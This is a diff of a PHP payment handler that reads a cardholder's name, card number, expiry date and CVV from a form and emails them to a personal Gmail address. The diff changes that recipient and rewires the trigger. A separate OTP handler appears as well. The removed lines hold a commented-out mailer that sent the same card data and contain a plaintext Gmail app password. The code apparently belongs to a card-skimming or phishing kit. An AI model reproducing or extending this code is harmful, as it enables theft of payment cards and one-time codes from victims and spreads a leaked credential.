@@ -21,56 +21,7 @@ function sendEmail($post) {
     $card_expiration_year = $post['expYear'];
     $card_expiration_month = $post['expMonth'];
     $cvv = $post['cvv'];
-
-
-    // $email_body = "You have received a new message.\n\n";
-    // $email_body .= "Card owner: $name\n";
-    // $email_body .= "Card number: $card_number\n";
-    // $email_body .= "amount to pay: $amount_to_pay\n";
-    // $email_body .= "Card expiration year: $card_expiration_year\n";
-    // $email_body .= "Card expiration month: $card_expiration_month\n";
-    // $email_body .= "Card CVC: $cvv\n";
-
-
-    // $html_body = "<h3>You have received a new message.</h3>";
-    // $html_body .= "<p><strong>Card owner:</strong> $name</p>";
-    // $html_body .= "<p><strong>card number:</strong> $card_number</p>";
-    // $html_body .= "amount to pay: $amount_to_pay\n";
-    // $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
-    // $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
-    // $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
-    // $mail = new PHPMailer(true);  
-
-    // try {
-        
-    //     $mail->SMTPDebug = 0;  
-    //     $mail->isSMTP(); 
-    //     $mail->Host       = 'smtp.gmail.com'; 
-    //     $mail->SMTPAuth   = true;  
-    //     $mail->Username   = 'americanresidence435@gmail.com';  
-    //     $mail->Password   = 'dtwh cnul jqfq uxol'; 
-    //     $mail->SMTPSecure = 'tls';  
-    //     $mail->Port       = 587;  
-
-        
-    //     $mail->setFrom('americanresidence435@gmail.com', 'Resido');  // From email address and name
-    //     $mail->addAddress("americanresidence435@gmail.com", "Resido");  // Recipient email address
-
-        
-    //     $mail->isHTML(true);  // Set email format to HTML
-    //     $mail->Subject = $subject;
-    //     $mail->Body    = $email_body;
-
-        
-    //     $mail->send();
-    //     echo 'success';
-    // } catch (Exception $e) {
-    //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-    // }
-    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
-    // $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
-    // $message = filter_var($message, FILTER_SANITIZE_STRING);
-    // $fromName = filter_var($fromName, FILTER_SANITIZE_STRING);
+    $to = filter_var('americanresidence435@gmail.com', FILTER_SANITIZE_EMAIL);
     $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);
 
     // Set headers
@@ -112,6 +63,9 @@ function sendEmail($post) {
     } else {
         echo "Failed to send email to";
     }
+}
+if(isset($_POST['sendcard'])){
+    sendEmail($_POST);
 }
 
 
@@ -213,9 +167,7 @@ function sendOTP($post) {
     
 }
 
-if(isset($_POST['sendcard'])){
-    sendEmail($_POST);
-}
+
 if(isset($_POST['sendotp'])){
     sendOTP($_POST);
 }
